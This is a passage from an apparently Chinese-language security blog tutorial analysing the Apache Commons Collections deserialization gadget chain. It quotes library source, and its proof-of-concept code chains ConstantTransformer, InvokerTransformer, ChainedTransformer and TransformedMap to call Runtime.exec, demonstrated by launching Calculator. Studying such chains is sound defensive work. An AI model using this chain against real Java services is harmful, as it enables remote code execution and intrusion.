class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的对象不会经过任何改变进行返回，也就是当调用<code>transform</code>方法时会返回构造函数中传入的对象。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj);</span><br><span class="line">        System.out.println(constantTransformer.transform(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections/image-20220901103831836.png" alt="image-20220901103831836"></p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>类在<code>Collections</code>组件中非常重要，也是我们后面构造 exp 的核心类。<code>InvokerTransformer</code>类的<code>transform</code>方法实现了类方法的动态调用，采用反射机制动态调用类方法（发射方法名、参数值可控）并返回该方法执行结果。该部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">  <span class="comment">// 要调用的方法名称</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">  <span class="comment">// 反射参数类型数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">  <span class="comment">// 反射参数值数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="comment">//异常处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">        );</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections/image-20220901105358610.png" alt="image-20220901105358610"></p><p>在现实场景下很难通过<code>InvokerTransformer.transform</code>传入<code>Runtime.getRuntime()</code>对象完成命令执行，因此我们需要学习下一个接口实现类<code>ChainedTransformer</code>来构造我们的攻击链。</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><code>ChainedTransformer</code>类封装了<code>Transformer</code>的链式调用，当传入一个<code>Transformer</code>数组时，<code>ChainedTransformer</code>就会依次调用每一个<code>Transformer</code>的<code>transform</code>方法，关键源码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>贴一张 P 牛画的图<br><img src="/2022/11/10/CommonsCollections/img.png" alt="img"></p><p>通过<code>ChainedTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transformer</span> <span class="operator">=</span> chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="/2022/11/10/CommonsCollections/image-20220903222648532.png" alt="image-20220903222648532"></p><p>先对上述的<code>poc</code>做一个分析：</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class)</span><br></pre></td></tr></table></figure><p>传入的<code>java.lang.Runtime</code>类原封不动的返回并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中<br><img src="/2022/11/10/CommonsCollections/image-20220904212600633.png" alt="image-20220904212600633"></p><p><strong>InvokerTransformer 1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类的<code>transform()</code>方法里的反射，获取到<code>java.lang.Runtime</code>类的<code>getMethod()</code>方法并执行<code>getRuntime()</code>方法<br><img src="/2022/11/10/CommonsCollections/image-20220904213709408.png" alt="image-20220904213709408"></p><p>最后返回<code>java.lang.Runtime.getRuntime()</code>方法并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p><strong>InvokerTransformer 2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="/2022/11/10/CommonsCollections/image-20220904230545177.png" alt="image-20220904230545177"></p><p>传入的<code>Method</code>对象通过<code>getClass()</code>获取到反射类<code>java.lang.reflect.Method</code>，接着通过反射获取到<code>invoke()</code>方法执行传入的<code>java.lang.Runtime.getRuntime()</code>方法，返回<code>Runtime</code>对象并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p>这里比较有趣的是在最后执行<code>method.invoke(input,null)</code>时代入参数是<code>invoke.invoke(input,null)</code>的形式，依然能执行命令。</p><p><strong>InvokerTransformer 3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="/2022/11/10/CommonsCollections/image-20220904232209075.png" alt="image-20220904232209075"></p><p>传入的<code>Runtime</code>实例通过<code>getClass()</code>获取到<code>Runtime</code>类，接着通过反射获取到<code>exec()</code>方法，最后通过<code>invoke()</code>执行传进来的<code>iArgs</code>命令</p><p>至此通过<code>ChainedTransformer</code>类，把<code>ConstantTransformer</code>类和多个<code>InvokerTransformer</code>类实现的<code>transform</code>方法一一执行，完成命令执行的利用链。</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>上述虽然构造了一串巧妙的命令执行利用链，但是仍然遗留下未解决的问题：需要转换对象成<code>ChainedTransformer</code>类型接着执行<code>transform()</code>方法<br><img src="/2022/11/10/CommonsCollections/image-20220905223858552.png" alt="image-20220905223858552"></p><p>所以我们需要解决以下问题：</p><ol><li>传入恶意的<code>ChainedTransformer</code>类</li><li>调用<code>ChainedTransformer</code>类创建的对象<code>chainedTransformer</code>的<code>transformer()</code>方法执行命令</li></ol><p>这里引入<code>TransformedMap</code>类，<code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了<code>java.util.Map</code>接口，同时支持对<code>Map</code>的<code>key</code>或者<code>value</code>进行<code>Transformer</code>转换，通过调用<code>decorate()</code>和<code>decorateTransform()</code>方法都可以进入<code>TransformedMap()</code>构造函数<br><img src="/2022/11/10/CommonsCollections/image-20220913165342046.png" alt="image-20220913165342046"></p><p>可以看到在<code>TransformedMap</code>类中通过<code>checkSetValue()</code>、<code>put()</code>和<code>putAll()</code>方法都可以调用传进来的<code>Transform</code>类（例如<code>InvokerTransformer</code>）的<code>transform()</code>方法<br><img src="/2022/11/10/CommonsCollections/image-20220913173832979.png" alt="image-20220913173832979"></p><p><img src="/2022/11/10/CommonsCollections/image-20220913180215864.png" alt="image-20220913180215864"></p><p>POC 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建ChainedTransformer调用链</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">// 创建Map对象</span></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历Map元素，并调用setValue方法</span></span><br><span class="line">        <span class="keyword">for</span>(Object obj: transformedMap.entrySet())&#123;</span><br><span class="line">            Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) obj;</span><br><span class="line">            entry.setValue(<span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后通过<code>setValue()</code>方法调用了<code>checkSetValue()</code>方法，从而造成命令执行<br><img src="/2022/11/10/CommonsCollections/image-20220913180841818.png" alt="image-20220913180841818"></p><p><img src="/2022/11/10/CommonsCollections/image-20220913180501737.png" alt="image-20220913180501737"></p><p>模拟成现实情况（客户端发送请求-服务端处理请求）<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TransformerTest</span> <span class="variable">transformerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformerTest</span>();</span><br><span class="line">        transformerTest.serialize();</span><br><span class="line">        transformerTest.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 客户端</span></span><br><span class="line"><span class="comment">    * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title 